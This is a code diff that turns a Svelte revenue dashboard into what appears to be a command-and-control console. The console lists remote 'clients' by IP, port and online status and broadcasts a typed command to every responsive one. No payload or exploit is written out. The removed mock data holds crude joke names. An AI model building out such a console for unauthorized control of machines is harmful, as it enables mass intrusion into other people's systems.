@@ -1,108 +1,310 @@
 <script lang="ts">
-	import { scaleBand } from 'd3-scale';
-	import { Axis, Bars, Chart, Highlight, Svg, Tooltip } from 'layerchart';
+	import { authFetch } from '$lib/auth';
 
 	type Client = {
-		name: string;
-		company: string;
-		email: string;
-		status: 'Active' | 'Inactive' | 'Pending';
-		revenue: number;
+		id: number;
+		identifier: string;
+		system_type: string;
+		ip_address: string;
+		target_port: number;
+		date_added: string;
+		last_seen: string | null;
+		status: string;
 	};
 
-	const clients: Client[] = [
-		{ name: 'Ben Dover', company: 'TechVault Inc.', email: 'sarah@techvault.com', status: 'Active', revenue: 12400 },
-		{ name: 'JorJor Well', company: 'DataStream LLC', email: 'marcus@datastream.io', status: 'Active', revenue: 9800 },
-		{ name: 'Nick Gurh', company: 'CloudNine Solutions', email: 'priya@cloudnine.dev', status: 'Pending', revenue: 6200 },
-		{ name: 'Dixie Normus', company: 'Apex Digital', email: 'james@apexdigital.com', status: 'Active', revenue: 15600 },
-		{ name: 'Moe Lester', company: 'BrightPath Co.', email: 'elena@brightpath.co', status: 'Inactive', revenue: 3100 },
-		{ name: 'Kanye', company: 'NovaTech', email: 'david@novatech.io', status: 'Active', revenue: 11200 },
-		{ name: 'Lisa Thompson', company: 'PeakView Labs', email: 'lisa@peakview.com', status: 'Pending', revenue: 7800 },
-		{ name: 'Omar Hassan', company: 'SynergyWorks', email: 'omar@synergyworks.net', status: 'Active', revenue: 8900 }
-	];
+	let clients = $state<Client[]>([]);
+	let loading = $state(true);
 
-	type ChartData = { name: string; revenue: number };
-	const chartData: ChartData[] = clients.map((c) => ({ name: c.name.split(' ')[0], revenue: c.revenue }));
+	async function loadClients() {
+		try {
+			const res = await authFetch('/api/clients');
+			if (res.ok) {
+				clients = await res.json();
+			}
+		} catch { /* silent */ }
+		loading = false;
+	}
+
+	loadClients();
 
 	function statusColor(status: string): string {
 		switch (status) {
-			case 'Active': return '#22c55e';
-			case 'Inactive': return '#ef4444';
-			case 'Pending': return '#f59e0b';
+			case 'responsive': return '#22c55e';
+			case 'non-responsive': return '#ef4444';
 			default: return '#6b7280';
 		}
+	}
+
+	function statusLabel(status: string): string {
+		switch (status) {
+			case 'responsive': return 'Online';
+			case 'non-responsive': return 'Offline';
+			default: return status;
+		}
+	}
+
+	let commandInput = $state('');
+	let activeCommand = $state('');
+	let commandStatus = $state<'idle' | 'sending' | 'active' | 'error'>('idle');
+
+	type HistoryEntry = {
+		command: string;
+		timestamp: string;
+		recipients: string[];
+	};
+
+	let commandHistory = $state<HistoryEntry[]>([]);
+	let historyExpanded = $state(false);
+	let selectedEntry = $state<HistoryEntry | null>(null);
+
+	const visibleHistory = $derived(historyExpanded ? commandHistory : commandHistory.slice(0, 3));
+
+	async function sendCommand() {
+		const cmd = commandInput.trim();
+		if (!cmd) return;
+
+		commandStatus = 'sending';
+		try {
+			const res = await authFetch('/api/settings', {
+				method: 'PUT',
+				headers: { 'Content-Type': 'application/json' },
+				body: JSON.stringify({ pending_command: cmd })
+			});
+			if (res.ok) {
+				activeCommand = cmd;
+				commandInput = '';
+				commandStatus = 'active';
+				commandHistory.unshift({
+					command: cmd,
+					timestamp: new Date().toLocaleString(),
+					recipients: clients.filter(c => c.status === 'responsive').map(c => c.identifier)
+				});
+			} else {
+				commandStatus = 'error';
+			}
+		} catch {
+			commandStatus = 'error';
+		}
+	}
+
+	function handleKeydown(e: KeyboardEvent) {
+		if (e.key === 'Enter') sendCommand();
+	}
+
+	// --- Add Client ---
+	let showAddClient = $state(false);
+	let newClient = $state({ identifier: '', system_type: '', ip_address: '', target_port: '' });
+	let addError = $state('');
+	let addLoading = $state(false);
+
+	async function addClient(e: Event) {
+		e.preventDefault();
+		addError = '';
+		addLoading = true;
+		try {
+			const res = await authFetch('/api/clients', {
+				method: 'POST',
+				headers: { 'Content-Type': 'application/json' },
+				body: JSON.stringify(newClient)
+			});
+			const data = await res.json();
+			if (res.ok) {
+				showAddClient = false;
+				newClient = { identifier: '', system_type: '', ip_address: '', target_port: '' };
+				loadClients();
+			} else {
+				addError = data.error || 'Failed to add client.';
+			}
+		} catch {
+			addError = 'Unable to connect to server.';
+		} finally {
+			addLoading = false;
+		}
+	}
+
+	function openDetails(entry: HistoryEntry) {
+		selectedEntry = entry;
+	}
+
+	function closeDetails() {
+		selectedEntry = null;
 	}
 </script>
 
 <div class="page">
 	<div class="page-header">
 		<h1>Management</h1>
-		<p class="subtitle">Client overview and revenue breakdown</p>
+		<p class="subtitle">Client overview and status monitoring</p>
 	</div>
 
-	<div class="card chart-section">
-		<h2>Revenue by Client</h2>
-		<div class="bar-chart">
-			<Chart
-				data={chartData}
-				x="revenue"
-				xDomain={[0, null]}
-				xNice
-				y="name"
-				yScale={scaleBand().padding(0.4)}
-				padding={{ left: 60, bottom: 30, right: 16 }}
-				tooltip={{ mode: 'band' }}
+	<div class="card command-section">
+		<h2>Send Command</h2>
+		<div class="command-row">
+			<input
+				type="text"
+				class="command-input"
+				placeholder="Enter command to send to clients..."
+				bind:value={commandInput}
+				onkeydown={handleKeydown}
+				disabled={commandStatus === 'sending'}
+			/>
+			<button
+				class="command-btn"
+				onclick={sendCommand}
+				disabled={!commandInput.trim() || commandStatus === 'sending'}
 			>
-				<Svg>
-					<Axis placement="bottom" grid rule format={(v) => `$${(v / 1000).toFixed(0)}k`} />
-					<Axis placement="left" rule />
-					<Bars radius={4} class="fill-purple-600" />
-					<Highlight area />
-				</Svg>
-				<Tooltip.Root>
-					{#snippet children({ data }: { data: ChartData })}
-						<Tooltip.Header>{data.name}</Tooltip.Header>
-						<Tooltip.List>
-							<Tooltip.Item label="Revenue" value={`$${data.revenue.toLocaleString()}`} />
-						</Tooltip.List>
-					{/snippet}
-				</Tooltip.Root>
-			</Chart>
+				{commandStatus === 'sending' ? 'Sending...' : 'Enter'}
+			</button>
 		</div>
+		{#if activeCommand}
+			<div class="active-command">
+				<span class="active-dot"></span>
+				<span class="active-label">Active:</span>
+				<code class="active-value">{activeCommand}</code>
+			</div>
+		{/if}
+		{#if commandStatus === 'error'}
+			<div class="command-error">Failed to send command. Check server connection.</div>
+		{/if}
 	</div>
+
+	{#if commandHistory.length > 0}
+		<div class="card history-section">
+			<h2>Command History</h2>
+			<div class="history-list">
+				{#each visibleHistory as entry}
+					<button class="history-item" onclick={() => openDetails(entry)}>
+						<code class="history-cmd">{entry.command}</code>
+						<span class="history-meta">
+							<span class="history-recipients">{entry.recipients.length} clients</span>
+							<span class="history-time">{entry.timestamp}</span>
+						</span>
+					</button>
+				{/each}
+			</div>
+			{#if commandHistory.length > 3}
+				<button class="more-link" onclick={() => historyExpanded = !historyExpanded}>
+					{historyExpanded ? 'Show less' : `Show ${commandHistory.length - 3} more`}
+				</button>
+			{/if}
+		</div>
+	{/if}
+
+	{#if selectedEntry}
+		<div class="modal-backdrop" onclick={closeDetails} role="presentation">
+			<div class="modal" onclick={(e) => e.stopPropagation()} role="dialog">
+				<div class="modal-header">
+					<h3>Command Details</h3>
+					<button class="modal-close" onclick={closeDetails}>&times;</button>
+				</div>
+				<div class="modal-body">
+					<div class="detail-row">
+						<span class="detail-label">Command</span>
+						<code class="detail-value">{selectedEntry.command}</code>
+					</div>
+					<div class="detail-row">
+						<span class="detail-label">Sent</span>
+						<span class="detail-value">{selectedEntry.timestamp}</span>
+					</div>
+					<div class="detail-row">
+						<span class="detail-label">Recipients ({selectedEntry.recipients.length})</span>
+					</div>
+					<div class="recipients-list">
+						{#each selectedEntry.recipients as name}
+							<div class="recipient">
+								<span class="recipient-dot"></span>
+								{name}
+							</div>
+						{/each}
+					</div>
+				</div>
+			</div>
+		</div>
+	{/if}
 
 	<div class="card table-section">
-		<h2>All Clients</h2>
-		<div class="table-wrapper">
-			<table>
-				<thead>
-					<tr>
-						<th>Name</th>
-						<th>Company</th>
-						<th>Email</th>
-						<th>Status</th>
-						<th>Revenue</th>
-					</tr>
-				</thead>
-				<tbody>
-					{#each clients as client}
-						<tr>
-							<td class="name-cell">{client.name}</td>
-							<td>{client.company}</td>
-							<td class="email-cell">{client.email}</td>
-							<td>
-								<span class="status-badge" style:color={statusColor(client.status)} style:background-color="{statusColor(client.status)}18">
-									{client.status}
-								</span>
-							</td>
-							<td class="revenue-cell">${client.revenue.toLocaleString()}</td>
-						</tr>
-					{/each}
-				</tbody>
-			</table>
+		<div class="section-header">
+			<h2>All Clients</h2>
+			<button class="add-client-btn" onclick={() => showAddClient = true}>+ Add Client</button>
 		</div>
+		{#if loading}
+			<div class="placeholder"><span>Loading clients...</span></div>
+		{:else if clients.length === 0}
+			<div class="placeholder"><span>No clients registered yet</span></div>
+		{:else}
+			<div class="table-wrapper">
+				<table>
+					<thead>
+						<tr>
+							<th>Identifier</th>
+							<th>System</th>
+							<th>IP Address</th>
+							<th>Port</th>
+							<th>Status</th>
+							<th>Last Seen</th>
+						</tr>
+					</thead>
+					<tbody>
+						{#each clients as client}
+							<tr>
+								<td class="name-cell">{client.identifier}</td>
+								<td>{client.system_type}</td>
+								<td class="mono-cell">{client.ip_address}</td>
+								<td class="mono-cell">{client.target_port}</td>
+								<td>
+									<span class="status-badge" style:color={statusColor(client.status)} style:background-color="{statusColor(client.status)}18">
+										{statusLabel(client.status)}
+									</span>
+								</td>
+								<td class="muted-cell">{client.last_seen ?? '—'}</td>
+							</tr>
+						{/each}
+					</tbody>
+				</table>
+			</div>
+		{/if}
 	</div>
 </div>
+
+{#if showAddClient}
+	<div class="modal-backdrop" onclick={() => showAddClient = false} role="presentation">
+		<div class="modal" onclick={(e) => e.stopPropagation()} role="dialog">
+			<div class="modal-header">
+				<h3>Add Client</h3>
+				<button class="modal-close" onclick={() => showAddClient = false}>&times;</button>
+			</div>
+			<div class="modal-body">
+				<form onsubmit={addClient}>
+					<div class="form-field">
+						<label for="ac-id">Identifier</label>
+						<input id="ac-id" type="text" bind:value={newClient.identifier} placeholder="e.g. SHADOWFANG" required />
+					</div>
+					<div class="form-field">
+						<label for="ac-sys">System</label>
+						<input id="ac-sys" type="text" bind:value={newClient.system_type} placeholder="e.g. Linux" required />
+					</div>
+					<div class="form-field">
+						<label for="ac-ip">IP Address</label>
+						<input id="ac-ip" type="text" bind:value={newClient.ip_address} placeholder="e.g. 192.168.1.10" required />
+					</div>
+					<div class="form-field">
+						<label for="ac-port">Port</label>
+						<input id="ac-port" type="text" inputmode="numeric" pattern="[0-9]*" bind:value={newClient.target_port} placeholder="e.g. 8080" required />
+					</div>
+					{#if addError}
+						<div class="form-error">{addError}</div>
+					{/if}
+					<div class="form-actions">
+						<button type="button" class="btn-cancel" onclick={() => showAddClient = false}>Cancel</button>
+						<button type="submit" class="btn-submit" disabled={addLoading}>
+							{addLoading ? 'Adding...' : 'Add Client'}
+						</button>
+					</div>
+				</form>
+			</div>
+		</div>
+	</div>
+{/if}
 
 <style>
 	.page {
@@ -143,8 +345,399 @@
 		margin: 0 0 1rem;
 	}
 
-	.bar-chart {
-		height: 320px;
+	.command-row {
+		display: flex;
+		gap: 0;
+	}
+
+	.command-input {
+		flex: 1;
+		padding: 0.7rem 0.875rem;
+		border: 1px solid var(--color-border);
+		border-right: none;
+		border-radius: 8px 0 0 8px;
+		background-color: var(--color-surface);
+		color: var(--color-text);
+		font-size: 0.875rem;
+		font-family: 'SF Mono', 'Fira Code', monospace;
+		transition: border-color 0.15s ease;
+	}
+
+	.command-input::placeholder {
+		color: var(--color-text-muted);
+		font-family: inherit;
+	}
+
+	.command-input:focus {
+		outline: none;
+		border-color: #a855f7;
+		box-shadow: 0 0 0 3px rgba(168, 85, 247, 0.15);
+	}
+
+	.command-input:disabled {
+		opacity: 0.5;
+	}
+
+	.command-btn {
+		padding: 0.7rem 1.5rem;
+		background: linear-gradient(135deg, #a855f7, #7e22ce);
+		color: white;
+		border: none;
+		border-radius: 0 8px 8px 0;
+		font-size: 0.875rem;
+		font-weight: 600;
+		cursor: pointer;
+		transition: opacity 0.15s ease;
+		white-space: nowrap;
+	}
+
+	.command-btn:hover:not(:disabled) {
+		opacity: 0.9;
+	}
+
+	.command-btn:disabled {
+		opacity: 0.4;
+		cursor: not-allowed;
+	}
+
+	.active-command {
+		display: flex;
+		align-items: center;
+		gap: 0.5rem;
+		margin-top: 0.75rem;
+		padding: 0.5rem 0.75rem;
+		background-color: rgba(34, 197, 94, 0.08);
+		border: 1px solid rgba(34, 197, 94, 0.2);
+		border-radius: 6px;
+		font-size: 0.8rem;
+	}
+
+	.active-dot {
+		width: 8px;
+		height: 8px;
+		border-radius: 50%;
+		background-color: #22c55e;
+		flex-shrink: 0;
+		animation: pulse 2s ease-in-out infinite;
+	}
+
+	@keyframes pulse {
+		0%, 100% { opacity: 1; }
+		50% { opacity: 0.4; }
+	}
+
+	.active-label {
+		color: #22c55e;
+		font-weight: 600;
+	}
+
+	.active-value {
+		color: var(--color-text);
+		font-family: 'SF Mono', 'Fira Code', monospace;
+		font-size: 0.8rem;
+	}
+
+	.command-error {
+		margin-top: 0.5rem;
+		padding: 0.5rem 0.75rem;
+		background-color: rgba(239, 68, 68, 0.08);
+		border: 1px solid rgba(239, 68, 68, 0.2);
+		border-radius: 6px;
+		color: #ef4444;
+		font-size: 0.8rem;
+	}
+
+	.history-list {
+		display: flex;
+		flex-direction: column;
+		gap: 0.375rem;
+	}
+
+	.history-item {
+		display: flex;
+		align-items: center;
+		justify-content: space-between;
+		gap: 1rem;
+		padding: 0.6rem 0.75rem;
+		background-color: var(--color-surface);
+		border: 1px solid var(--color-border);
+		border-radius: 6px;
+		cursor: pointer;
+		transition: border-color 0.15s ease, background-color 0.15s ease;
+		text-align: left;
+		width: 100%;
+		color: inherit;
+		font: inherit;
+	}
+
+	.history-item:hover {
+		border-color: #a855f7;
+		background-color: var(--color-surface-hover);
+	}
+
+	.history-cmd {
+		font-family: 'SF Mono', 'Fira Code', monospace;
+		font-size: 0.8rem;
+		color: var(--color-text);
+	}
+
+	.history-meta {
+		display: flex;
+		align-items: center;
+		gap: 0.75rem;
+		font-size: 0.75rem;
+		color: var(--color-text-muted);
+		flex-shrink: 0;
+	}
+
+	.history-recipients {
+		color: #a855f7;
+		font-weight: 500;
+	}
+
+	.more-link {
+		display: inline-block;
+		margin-top: 0.5rem;
+		padding: 0;
+		background: none;
+		border: none;
+		color: #a855f7;
+		font-size: 0.8rem;
+		font-weight: 500;
+		cursor: pointer;
+	}
+
+	.more-link:hover {
+		text-decoration: underline;
+	}
+
+	.modal-backdrop {
+		position: fixed;
+		inset: 0;
+		background: rgba(0, 0, 0, 0.6);
+		display: flex;
+		align-items: center;
+		justify-content: center;
+		z-index: 100;
+	}
+
+	.modal {
+		background-color: var(--color-card-bg);
+		border: 1px solid var(--color-border);
+		border-radius: 12px;
+		width: 100%;
+		max-width: 460px;
+		box-shadow: 0 8px 32px rgba(0, 0, 0, 0.3);
+	}
+
+	.modal-header {
+		display: flex;
+		align-items: center;
+		justify-content: space-between;
+		padding: 1rem 1.25rem;
+		border-bottom: 1px solid var(--color-border);
+	}
+
+	.modal-header h3 {
+		font-size: 1rem;
+		font-weight: 600;
+		color: var(--color-text);
+		margin: 0;
+	}
+
+	.modal-close {
+		background: none;
+		border: none;
+		color: var(--color-text-muted);
+		font-size: 1.4rem;
+		cursor: pointer;
+		padding: 0;
+		line-height: 1;
+	}
+
+	.modal-close:hover {
+		color: var(--color-text);
+	}
+
+	.modal-body {
+		padding: 1.25rem;
+	}
+
+	.detail-row {
+		display: flex;
+		align-items: baseline;
+		gap: 0.75rem;
+		margin-bottom: 0.75rem;
+	}
+
+	.detail-label {
+		font-size: 0.75rem;
+		font-weight: 600;
+		text-transform: uppercase;
+		letter-spacing: 0.04em;
+		color: var(--color-text-muted);
+		flex-shrink: 0;
+	}
+
+	.detail-value {
+		font-size: 0.85rem;
+		color: var(--color-text);
+	}
+
+	code.detail-value {
+		font-family: 'SF Mono', 'Fira Code', monospace;
+		font-size: 0.8rem;
+	}
+
+	.recipients-list {
+		display: flex;
+		flex-direction: column;
+		gap: 0.35rem;
+		max-height: 200px;
+		overflow-y: auto;
+	}
+
+	.recipient {
+		display: flex;
+		align-items: center;
+		gap: 0.5rem;
+		font-size: 0.8rem;
+		color: var(--color-text);
+		padding: 0.35rem 0.5rem;
+		background-color: var(--color-surface);
+		border-radius: 4px;
+	}
+
+	.recipient-dot {
+		width: 6px;
+		height: 6px;
+		border-radius: 50%;
+		background-color: #22c55e;
+		flex-shrink: 0;
+	}
+
+	.section-header {
+		display: flex;
+		align-items: center;
+		justify-content: space-between;
+		margin-bottom: 1rem;
+	}
+
+	.section-header h2 {
+		margin: 0;
+	}
+
+	.add-client-btn {
+		padding: 0.4rem 0.85rem;
+		background: linear-gradient(135deg, #a855f7, #7e22ce);
+		color: white;
+		border: none;
+		border-radius: 6px;
+		font-size: 0.8rem;
+		font-weight: 600;
+		cursor: pointer;
+		transition: opacity 0.15s ease;
+	}
+
+	.add-client-btn:hover {
+		opacity: 0.9;
+	}
+
+	.form-field {
+		display: flex;
+		flex-direction: column;
+		gap: 0.3rem;
+		margin-bottom: 1rem;
+	}
+
+	.form-field label {
+		font-size: 0.75rem;
+		font-weight: 600;
+		text-transform: uppercase;
+		letter-spacing: 0.04em;
+		color: var(--color-text-muted);
+	}
+
+	.form-field input {
+		padding: 0.6rem 0.75rem;
+		border: 1px solid var(--color-border);
+		border-radius: 6px;
+		background-color: var(--color-surface);
+		color: var(--color-text);
+		font-size: 0.85rem;
+	}
+
+	.form-field input:focus {
+		outline: none;
+		border-color: #a855f7;
+		box-shadow: 0 0 0 3px rgba(168, 85, 247, 0.15);
+	}
+
+	.form-field input::placeholder {
+		color: var(--color-text-muted);
+	}
+
+	.form-error {
+		padding: 0.5rem 0.75rem;
+		background-color: rgba(239, 68, 68, 0.08);
+		border: 1px solid rgba(239, 68, 68, 0.2);
+		border-radius: 6px;
+		color: #ef4444;
+		font-size: 0.8rem;
+		margin-bottom: 1rem;
+	}
+
+	.form-actions {
+		display: flex;
+		justify-content: flex-end;
+		gap: 0.5rem;
+	}
+
+	.btn-cancel {
+		padding: 0.5rem 1rem;
+		background: none;
+		border: 1px solid var(--color-border);
+		border-radius: 6px;
+		color: var(--color-text-muted);
+		font-size: 0.8rem;
+		font-weight: 500;
+		cursor: pointer;
+	}
+
+	.btn-cancel:hover {
+		color: var(--color-text);
+		border-color: var(--color-text-muted);
+	}
+
+	.btn-submit {
+		padding: 0.5rem 1rem;
+		background: linear-gradient(135deg, #a855f7, #7e22ce);
+		color: white;
+		border: none;
+		border-radius: 6px;
+		font-size: 0.8rem;
+		font-weight: 600;
+		cursor: pointer;
+	}
+
+	.btn-submit:hover:not(:disabled) {
+		opacity: 0.9;
+	}
+
+	.btn-submit:disabled {
+		opacity: 0.4;
+		cursor: not-allowed;
+	}
+
+	.placeholder {
+		height: 120px;
+		display: flex;
+		align-items: center;
+		justify-content: center;
+		border: 2px dashed var(--color-border);
+		border-radius: 8px;
+		color: var(--color-text-muted);
+		font-size: 0.875rem;
 	}
 
 	.table-wrapper {
@@ -186,13 +779,15 @@
 		font-weight: 600;
 	}
 
-	.email-cell {
+	.mono-cell {
+		font-family: 'SF Mono', 'Fira Code', monospace;
+		font-size: 0.8rem;
 		color: var(--color-text-muted);
 	}
 
-	.revenue-cell {
-		font-weight: 600;
-		font-variant-numeric: tabular-nums;
+	.muted-cell {
+		color: var(--color-text-muted);
+		font-size: 0.8rem;
 	}
 
 	.status-badge {
